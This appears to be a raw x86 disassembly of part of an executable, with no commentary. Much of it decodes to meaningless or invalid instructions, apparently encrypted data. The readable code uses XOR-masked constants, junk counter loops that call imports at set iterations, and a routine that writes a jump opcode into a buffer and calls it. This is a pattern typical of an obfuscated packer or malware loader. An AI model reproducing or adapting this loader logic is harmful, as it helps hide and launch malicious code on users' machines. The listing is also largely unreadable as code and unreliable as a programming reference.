  406e80:	je     0x406ec9
  406e82:	out    0xc2,al
  406e84:	mov    ebx,0x87395c85
  406e89:	pop    ebp
  406e8a:	mov    edx,0x3ea28e03
  406e8f:	pop    es
  406e90:	(bad)  
  406e91:	mov    eax,ds:0x3e8ce128
  406e96:	xchg   esi,eax
  406e97:	or     bl,BYTE PTR [ebp+0x5a4b55b]
  406e9d:	xor    eax,0x2e8833eb
  406ea2:	imul   edx,DWORD PTR [ecx+0x2578c9e9],0x2f
  406ea9:	cmp    BYTE PTR ds:0xe4b85319,dl
  406eaf:	jge    0x406f01
  406eb1:	push   cs
  406eb2:	dec    esi
  406eb3:	in     eax,0x78
  406eb5:	ins    BYTE PTR es:[edi],dx
  406eb6:	cld    
  406eb7:	jb     0x406f03
  406eb9:	jecxz  0x406e43
  406ebb:	mov    edx,0x5b78eb5b
  406ec0:	mov    ebx,?
  406ec2:	xor    DWORD PTR [eax-0x7a],0xca022cda
  406ec9:	call   0xff2d:0x20d4509b
  406ed0:	(bad)  
  406ed2:	mov    dh,0x8f
  406ed4:	(bad)  
  406ed6:	stc    
  406ed7:	(bad)  
  406ed8:	retf   
  406ed9:	sti    
  406eda:	xchg   ebx,eax
  406edb:	mov    ecx,0x2e08956b
  406ee0:	xchg   BYTE PTR [ebx],al
  406ee2:	(bad)
  406ee6:	aaa    
  406ee7:	jbe    0x406f04
  406ee9:	and    ecx,DWORD PTR [edx+edi*2-0xc]
  406eed:	pop    ds
  406eee:	loopne 0x406edd
  406ef0:	mov    esi,0x64125033
  406ef5:	(bad)  {k1}{z}
  406efa:	inc    eax
  406efb:	inc    esi
  406efc:	fwait
  406efd:	cwde   
  406efe:	xchg   ebp,eax
  406eff:	jno    0x406e97
  406f01:	sbb    eax,0xffaa7382
  406f06:	xor    DWORD PTR [ebp+0x5f],ecx
  406f09:	sbb    al,0x61
  406f0b:	push   edx
  406f0c:	pop    es
  406f0d:	xor    esi,DWORD PTR [ebx+0x3816ce5]
  406f13:	pop    edx
  406f14:	inc    esp
  406f15:	cs je  0x406eb6
  406f18:	outs   dx,BYTE PTR ds:[esi]
  406f19:	mov    ds:0xdb8c2147,eax
  406f1e:	inc    eax
  406f1f:	test   DWORD PTR [edx-0x60],esi
  406f22:	push   edi
  406f23:	inc    edi
  406f24:	sub    BYTE PTR [edx+0x5a],dh
  406f27:	out    dx,eax
  406f28:	lods   al,BYTE PTR ds:[esi]
  406f29:	aas    
  406f2a:	les    edi,FWORD PTR [ebx+edi*8-0x274d6b53]
  406f31:	mov    cl,0x5f
  406f33:	adc    edx,DWORD PTR [ecx+0x35]
  406f36:	sbb    esp,esp
  406f38:	in     al,dx
  406f39:	mov    eax,0x70f129c3
  406f3e:	push   ecx
  406f3f:	add    esp,DWORD PTR [ecx+0x47]
  406f42:	jb     0x406f2e
  406f44:	out    dx,al
  406f45:	jbe    0x406fb9
  406f47:	mov    ch,0xf6
  406f49:	rcr    al,1
  406f4b:	push   0x25
  406f4d:	adc    al,0x99
  406f4f:	unpcklps xmm0,XMMWORD PTR [edi-0x44ad1301]
  406f56:	pusha  
  406f57:	xor    bh,BYTE PTR [ebx-0xb]
  406f5a:	xlat   BYTE PTR ds:[ebx]
  406f5b:	xchg   ecx,eax
  406f5c:	xchg   edi,eax
  406f5d:	cmp    DWORD PTR [esi],esi
  406f5f:	loopne 0x406f48
  406f61:	lods   eax,DWORD PTR ds:[esi]
  406f62:	add    ebx,0x2c9cdd80
  406f68:	jne    0x406fae
  406f6a:	mov    eax,DWORD PTR ds:0xf74ebb18
  406f70:	aad    0xb1
  406f72:	mov    eax,ds:0xaf589c9e
  406f77:	pop    ss
  406f78:	mov    dl,0xf1
  406f7a:	outs   dx,BYTE PTR ds:[esi]
  406f7b:	in     al,dx
  406f7c:	(bad)  
  406f7d:	or     dl,BYTE PTR [ecx+0x6e]
  406f80:	mov    ecx,0x2b0223a8
  406f85:	xchg   ebp,eax
  406f86:	sbb    al,0x18
  406f88:	nop
  406f89:	clc    
  406f8a:	inc    edi
  406f8b:	cld    
  406f8c:	xchg   ebx,eax
  406f8d:	stc    
  406f8e:	cld    
  406f8f:	pop    edi
  406f90:	xchg   ebp,eax
  406f91:	dec    ebx
  406f92:	sbb    BYTE PTR [ecx],al
  406f94:	aam    0xca
  406f96:	jmp    0x406fa6
  406f98:	loope  0x406f5b
  406f9a:	int    0x2
  406f9c:	mov    ds:0xa747f02c,al
  406fa1:	jge    0x406fe0
  406fa3:	lea    ecx,[esi]
  406fa5:	(bad)  
  406fa6:	push   ecx
  406fa7:	loop   0x406fa8
  406fa9:	cmp    al,BYTE PTR [ebp+edi*4+0x46ad0f15]
  406fb0:	je     0x406fb4
  406fb2:	sbb    eax,0x2829f8ab
  406fb7:	fld    QWORD PTR [ebp-0x1d464c75]
  406fbd:	inc    eax
  406fbe:	mov    edx,ebp
  406fc0:	loop   0x406f70
  406fc2:	push   ebp
  406fc3:	and    DWORD PTR [ecx],edx
  406fc5:	mov    ch,0x77
  406fc7:	sub    DWORD PTR [ecx+0x7c8ffc83],ebx
  406fcd:	rcr    ch,cl
  406fcf:	aas    
  406fd0:	and    BYTE PTR [ebx+0x4c],cl
  406fd3:	cmp    edx,DWORD PTR [ecx+esi*2]
  406fd6:	ret    0xc63c
  406fd9:	or     BYTE PTR [eax-0x6d68b32c],bh
  406fdf:	push   edx
  406fe0:	lods   eax,DWORD PTR ds:[esi]
  406fe1:	enter  0xae31,0x5
  406fe5:	rcl    BYTE PTR [ecx+eiz*1],1
  406fe8:	xchg   ebx,eax
  406fe9:	cmp    eax,eax
  406feb:	int    0x9c
  406fed:	jmp    0x407018
  406fef:	mov    eax,0x1dc71c11
  406ff4:	sub    DWORD PTR [ebx+0x4b],esi
  406ff7:	xchg   edi,eax
  406ff8:	mov    esi,?
  406ffa:	mov    al,BYTE PTR [eax]
  406ffc:	fidiv  DWORD PTR [edi]
  406ffe:	mov    cl,BYTE PTR [edi]
  407000:	into   
  407001:	mov    ds:0x646ba79a,al
  407006:	cli    
  407007:	sbb    eax,esi
  407009:	push   ecx
  40700a:	jmp    0x6a506e3a
  40700f:	ja     0x406fa9
  407011:	div    DWORD PTR [esi+0x1a]
  407014:	fs popf 
  407016:	scas   al,BYTE PTR es:[edi]
  407017:	inc    ebp
  407018:	and    cl,cl
  40701a:	test   BYTE PTR [edi-0x38],0xac
  40701e:	dec    esp
  40701f:	out    0xe4,al
  407021:	out    dx,eax
  407022:	dec    ebx
  407023:	(bad)  
  407024:	ficom  DWORD PTR [edx-0x2a441686]
  40702a:	adc    eax,0xaea9ae42
  40702f:	mov    ecx,0xd0a33e8b
  407034:	or     ch,BYTE PTR [edx+0xe]
  407037:	mov    edi,DWORD PTR [eax-0x21]
  40703a:	cmc    
  40703b:	and    esi,ecx
  40703d:	sbb    ecx,DWORD PTR [esi+0x3f]
  407040:	aad    0x26
  407042:	push   cs
  407043:	int    0xd2
  407045:	mov    ebx,0x599ef074
  40704a:	add    eax,0x4baec849
  40704f:	xchg   esp,eax
  407050:	push   ss
  407051:	wrmsr  
  407053:	inc    esp
  407054:	pop    ebx
  407055:	aaa    
  407056:	mov    ah,0xfa
  407058:	pop    esi
  407059:	in     al,0x95
  40705b:	ret    0x5b5c
  40705e:	pop    ebp
  40705f:	xchg   ecx,eax
  407060:	ins    DWORD PTR es:[edi],dx
  407061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407062:	jns    0x407000
  407064:	hlt    
  407065:	dec    ebp
  407066:	pop    ebx
  407067:	add    ecx,ebp
  407069:	shl    bh,cl
  40706b:	dec    edx
  40706c:	add    eax,0x837845f7
  407071:	push   edi
  407072:	xchg   ebp,eax
  407073:	pop    ss
  407074:	scas   al,BYTE PTR es:[edi]
  407075:	mov    WORD PTR [edx],es
  407077:	mov    ecx,0xd529a8c9
  40707c:	call   0xa6fb:0xc6ba5ac5
  407083:	cli    
  407084:	mov    ecx,0x8d6f74a3
  407089:	pop    eax
  40708a:	jl     0x4070dd
  40708c:	repz ss js 0x407087
  407090:	out    0xd8,eax
  407092:	cmp    ebx,eax
  407094:	sbb    BYTE PTR [edi-0x21],0x79
  407098:	cmp    DWORD PTR [esi+0x7d],ecx
  40709b:	jbe    0x407041
  40709d:	push   cs
  40709e:	xchg   esp,eax
  40709f:	adc    BYTE PTR [ebx],bl
  4070a1:	fstp   st(0)
  4070a3:	or     esi,DWORD PTR [edx-0x75]
  4070a6:	outs   dx,BYTE PTR ds:[esi]
  4070a7:	inc    esp
  4070a8:	cmp    al,0xbe
  4070aa:	mov    ecx,edx
  4070ac:	dec    edx
  4070ad:	neg    BYTE PTR [ecx-0x2e9849ac]
  4070b3:	dec    esp
  4070b4:	pusha  
  4070b5:	test   eax,0x522955f0
  4070ba:	iret   
  4070bb:	into   
  4070bc:	in     eax,dx
  4070bd:	jmp    0x322600fa
  4070c2:	retf   
  4070c3:	ret    
  4070c4:	xchg   esi,eax
  4070c5:	dec    eax
  4070c6:	dec    edx
  4070c7:	das    
  4070c8:	jg     0x407083
  4070ca:	(bad)  
  4070cb:	sub    ebp,DWORD PTR [ebp+0x17]
  4070ce:	jno    0x407114
  4070d0:	and    DWORD PTR [ebp+0x5e],edi
  4070d3:	jmp    0x8b1825b2
  4070d8:	mov    cl,0x38
  4070da:	sti    
  4070db:	ss add bh,bl
  4070de:	xchg   esi,eax
  4070df:	mov    esp,0x32b5f72d
  4070e4:	or     eax,0x8ad5a3d3
  4070e9:	add    DWORD PTR [eax+ecx*1+0x4edf9960],eax
  4070f0:	adc    al,0x70
  4070f2:	mov    eax,ds:0x42ca7f17
  4070f7:	mov    dh,0x2d
  4070f9:	push   0xffffff97
  4070fb:	adc    dl,BYTE PTR ds:0xf356b301
  407101:	cmp    BYTE PTR [esi-0x1b8df859],0x1d
  407108:	scas   al,BYTE PTR es:[edi]
  407109:	jno    0x407148
  40710b:	or     al,0xe4
  40710d:	xchg   BYTE PTR [edx-0x6d9b3464],bh
  407113:	push   edx
  407114:	jl     0x4070d4
  407116:	sbb    ebx,DWORD PTR [edi]
  407118:	mov    edi,0x987b465f
  40711d:	pop    ss
  40711e:	aam    0x96
  407120:	ret    
  407121:	and    edx,esp
  407123:	lods   eax,DWORD PTR ds:[esi]
  407124:	outs   dx,BYTE PTR ds:[esi]
  407125:	in     al,dx
  407126:	push   ebp
  407127:	mov    BYTE PTR [edx+0x2f],dh
  40712a:	mov    esi,0xa4abc470
  40712f:	mov    eax,0xb20f45e7
  407134:	cmp    al,0xcf
  407136:	cmp    eax,0xae06e1f0
  40713b:	icebp  
  40713c:	and    DWORD PTR [edi],0x83e95cb4
  407142:	xchg   esp,eax
  407143:	lahf   
  407144:	mov    ds:0x1854a235,al
  407149:	dec    edx
  40714a:	fild   QWORD PTR [edi]
  40714c:	mov    al,ds:0xe6badff8
  407151:	sbb    eax,0xd7a0be50
  407156:	push   ebp
  407157:	data16 aam 0x3f
  40715a:	pop    es
  40715b:	pop    ebp
  40715c:	dec    esp
  40715d:	mov    bh,0xc8
  40715f:	(bad)  
  407162:	nop
  407163:	mov    cl,0x7a
  407165:	(bad)  
  407166:	or     ebx,DWORD PTR [edx-0x7a7b91b6]
  40716c:	jnp    0x4071ab
  40716e:	xor    al,cl
  407170:	mov    ecx,0xba4065e4
  407175:	fst    QWORD PTR [esi]
  407177:	cwde   
  407178:	jmp    0xd7d3a651
  40717d:	or     al,0x35
  40717f:	jmp    DWORD PTR [ecx+0x3ca877a2]
  407185:	nop
  407186:	je     0x407146
  407188:	inc    esi
  407189:	mov    cl,0xbe
  40718b:	fimul  WORD PTR [esi]
  40718d:	inc    ebx
  40718e:	inc    edi
  40718f:	xchg   DWORD PTR [ebx],edx
  407191:	dec    ecx
  407192:	xchg   edx,eax
  407193:	sub    eax,0x2b752266
  407198:	data16 mov dl,0xe6
  40719b:	lods   eax,DWORD PTR ds:[esi]
  40719c:	push   0x3c
  40719e:	fistp  WORD PTR [ebx]
  4071a0:	mov    bl,0x70
  4071a2:	jge    0x4071ad
  4071a4:	std    
  4071a5:	mov    dl,0x37
  4071a7:	test   DWORD PTR [ebx],ecx
  4071a9:	cwde   
  4071aa:	sbb    esp,DWORD PTR [edx-0x1eafff91]
  4071b0:	push   ebp
  4071b1:	push   edi
  4071b2:	aas    
  4071b3:	aas    
  4071b4:	inc    edx
  4071b5:	fdiv   QWORD PTR [eax+0x72]
  4071b8:	in     eax,0xc4
  4071ba:	jp     0x407166
  4071bc:	jmp    DWORD PTR fs:[ecx]
  4071bf:	or     edx,DWORD PTR [edx-0x5cde6137]
  4071c5:	push   ds
  4071c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c7:	into   
  4071c8:	mov    ds:0xcfb7f291,al
  4071cd:	push   ds
  4071ce:	mov    ds:0x401b0a90,eax
  4071d3:	push   ebx
  4071d4:	inc    ebx
  4071d5:	cmp    al,0xb8
  4071d7:	(bad)  
  4071d8:	and    al,0xa0
  4071da:	cmp    ah,BYTE PTR [edx]
  4071dc:	(bad)  
  4071dd:	sub    eax,0xd146e5
  4071e2:	mov    eax,0x9f3d030
  4071e7:	scas   eax,DWORD PTR es:[edi]
  4071e8:	popa   
  4071e9:	fld    DWORD PTR [ebx]
  4071eb:	cmc    
  4071ec:	fild   WORD PTR [edi-0x505a9df5]
  4071f2:	fstp   TBYTE PTR [edi+0x662db9d9]
  4071f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071f9:	aas    
  4071fa:	popa   
  4071fb:	fstenv gs:[ebx-0x322548ae]
  407203:	cli    
  407204:	adc    esp,eax
  407206:	pop    edi
  407207:	fdivr  st,st(0)
  407209:	mov    edx,0xea13fd3e
  40720e:	ins    DWORD PTR es:[edi],dx
  40720f:	jg     0x407258
  407211:	xchg   ebx,eax
  407212:	xor    eax,ecx
  407214:	mov    edx,0x3272dd
  407219:	add    eax,edx
  40721b:	mov    DWORD PTR [ebp+0x8],eax
  40721e:	mov    eax,DWORD PTR [ebp-0x14]
  407221:	xor    eax,ecx
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	jg     0x407796
  407751:	fs pop eax
  407753:	call   0x7a5f:0x197a7a20
  40775a:	jp     0x40772d
  40775c:	cmp    ch,BYTE PTR ds:0x42e18a
  407762:	push   ss
  407763:	jmp    0xf5526238
  407768:	mov    cl,BYTE PTR [edx+esi*8-0x34c440c8]
  40776f:	lods   eax,DWORD PTR ds:[esi]
  407770:	lods   eax,DWORD PTR ds:[esi]
  407771:	(bad)  
  407772:	cdq    
  407773:	xor    BYTE PTR ds:0xa90f2f04,ah
  407779:	sti    
  40777a:	lds    ebp,FWORD PTR [ebx-0x16ff4d8d]
